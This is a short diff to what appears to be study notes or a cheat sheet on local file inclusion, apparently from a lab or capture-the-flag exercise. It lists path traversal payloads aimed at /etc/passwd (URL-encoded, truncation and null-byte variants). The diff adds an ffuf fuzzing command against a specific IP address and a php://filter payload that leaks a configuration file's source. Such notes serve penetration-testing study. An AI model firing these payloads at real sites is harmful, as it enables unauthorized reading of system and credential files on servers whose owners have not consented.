@@ -10,7 +10,9 @@
 /index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
 /index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
 /index.php?language=../../../../etc/passwd%00
-/index.php?language=php://filter/read=convert.base64-encode/resource=config
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://94.237.53.219:51683/FUZZ.php -c -ic
+/index.php?language=php://filter/read=convert.base64-encode/resource=configure
 ```
 
 ## Remote Code Execution
